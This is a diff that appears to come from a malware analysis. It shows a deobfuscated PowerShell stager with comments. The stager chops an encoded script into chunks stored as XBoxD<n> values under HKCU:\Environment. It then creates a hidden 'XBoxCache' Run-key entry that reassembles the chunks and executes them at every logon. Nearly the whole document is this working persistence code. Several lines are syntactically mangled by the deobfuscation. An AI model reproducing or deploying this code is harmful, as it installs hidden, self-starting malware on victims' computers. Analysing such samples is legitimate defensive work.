@@ -1,8 +1,93 @@
-_m03tsfc: @{
-    XBoxCache = cmd /c start /min "" -windowStyle hidden -c(-windowStyle hidden -enC);
-    PSPath = Microsoft..Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;
-    PSParentPath = Microsoft..Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion;
-    PSChildName = Run;
-    PSDrive = HKCU;
-    PSProvider = Microsoft..Core\Registry
-} 0
+do {
+    $psScript = $env:xps2;
+    $regValueName = XBoxD;
+    $regValueAutoRunName = XBoxCache;
+	
+    # Gets the xps2 script and makes it in chunks
+    function f0($fargs) {
+        $content = $fargs[0];
+        $chunkSize = $fargs[1];
+        $chunkList = [System.Collections.Generic.List[string]]::new();
+        $tmpStr = '';
+        $contentChars = $content.ToCharArray();
+        for ($i = 0;$i -lt $contentChars.Length;$i++) {
+            $tmpStr += $contentChars[$i];
+            if ($tmpStr.Length -eq $chunkSize) {
+                $chunkList.Add($tmpStr);
+                $tmpStr = '';
+            }
+        }if ($tmpStr.Length -ne 0) {
+            $chunkList.Add($tmpStr);
+        }return $chunkList.ToArray();
+    }
+	
+    # Verifies if the register is already created
+	function f1($fargs) {
+        $regKey = $fargs[0];
+        $regName = $fargs[1];
+        if (Get-Member -InputObject(.Get-ItemProperty-Path $regKey)-Name $regName) {
+            return $true;
+        }return $false;
+    }
+	
+	function f2() {
+        $regEnvPath = HKCU:\Environment;
+        $regAutoRunPath = HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;
+        $regItemNamePrefix = $regValueName; # XBoxD
+        $regItemNameAutoRun = $regValueAutoRunName;
+        $psRunCmd = powershell -windowStyle hidden;
+        $chunkSize = 2039;
+        # chunks is the code from the xps2 script, in 2039 max chars
+        [string[]]$chunks = f0($psScript, $chunkSize);
+        
+        # Deletes all registers already set
+        for ($i = 1;$i -lt 2048;$i++) {
+            $valName = ($regItemNamePrefix + $i.ToString());
+            $isExistRecord = f1($regEnvPath, $valName);
+            if ($isExistRecord) {
+                try {
+                    .Remove-ItemProperty-Name($regItemNamePrefix + $i.ToString())-Path $regEnvPath;
+                }
+                catch {
+                    break;
+                }
+            }
+            else {
+                break;
+            }
+        }
+        
+        # Concatenates the command to run at the startup of the computer
+		$autoRunCommand = '';
+        for ($i = 0;$i -lt $chunks.Length;$i++) {
+            $name = $regItemNamePrefix + ($i + 1).ToString(); # XBoxD1, XBoxD2, XBoxD3 ...
+            # Stores the registers called "XBoxD<i>" in "HKCU:\Environment" with the value of the chunks of "xps2"
+            # Effectively, stores the script of xps2 in chunks
+            .New-ItemProperty-Name $name -PropertyType 'String' -Value  $chunks[$i] -Path $regEnvPath;
+            
+            # autoRunCommand becomes $env:XBoxD1+XBoxD2+XBoxD3+...
+            # Effectively, it becomes the script of xps2 itself: $env:<xps2_script>
+            $autoRunCommand += ('$env:' + $name);
+            if ($i -lt $chunks.Length - 1) {
+                $autoRunCommand += '+';
+            }
+            
+        }
+        
+        # aRC becomes ($env:<xps2_script>)
+		$autoRunCommand = '(' + $autoRunCommand + ')';
+        # temlateRecord becomes "cmd /c start /min "" powershell -windowStyle hidden -c(powershell -windowStyle hidden -enC($env:xxxvxxx))"
+        $temlateRecord = 'cmd /c start /min "" ' + $psRunCmd + ' -c(' + $psRunCmd + ' -enC($env:xxxvxxx))';
+        # autoRunRecord becomes "cmd /c start /min "" powershell -windowStyle hidden -c(powershell -windowStyle hidden -enC($env:<xps2_script>))"
+        $autoRunRecord = $temlateRecord.Replace('($env:xxxvxxx)', $autoRunCommand);
+        # Creates a new register called "XBoxCache" with the property as "String", with the value of :
+        #           cmd /c start /min "" powershell -windowStyle hidden -c(powershell -windowStyle hidden -enC($env:<xps2_script>))
+        #           and the path of "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        .New-ItemProperty-Name $regItemNameAutoRun -PropertyType 'String' -Value  $autoRunRecord -Path $regAutoRunPath -Force;
+        return 0;
+    }
+	
+	$r = f2;
+    Write-Output('_m03tsfc: ' + $r);
+}while ($false);
+    
